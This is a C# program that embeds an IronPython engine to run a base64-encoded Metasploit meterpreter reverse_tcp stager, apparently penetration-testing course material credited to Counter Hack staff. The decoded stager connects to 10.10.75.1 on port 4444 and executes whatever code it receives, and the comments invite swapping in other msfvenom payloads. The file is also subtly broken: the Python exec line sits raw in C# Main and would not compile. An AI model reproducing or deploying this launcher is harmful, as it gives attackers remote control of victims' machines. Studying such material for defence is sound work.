// This is the excellent work of Chris Davis of Counter Hack
// Small edits by Joshua Wright for clarity

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace csharp_py
{
    class Program
    {
        static void Main(string[] args)
        {
            // Create an IronPython engine to execute Python code
            Microsoft.Scripting.Hosting.ScriptEngine pythonEngine =
                IronPython.Hosting.Python.CreateEngine();

            // Print the default search paths
            // You may need to manually add these paths to include the DLLs necessary for execution
            System.Console.Out.WriteLine("Search paths:");
            ICollection<string> searchPaths = pythonEngine.GetSearchPaths();
            foreach (string path in searchPaths)
            {
                System.Console.Out.WriteLine(path);
            }
            System.Console.Out.WriteLine();

            // Now modify the search paths to include the directory
            // where the standard library has been installed
            searchPaths.Add(@"..\..\Lib");
            searchPaths.Add(@"..\Lib");
            searchPaths.Add(@".\Lib");
            pythonEngine.SetSearchPaths(searchPaths);

            // Execute the malicious Python coce
            // Replace the payload below with your own, possibly the output of msfvenom
            // msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.75.1
            exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEwLjEwLjc1LjEnLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo=')[0]))

        }
    }
}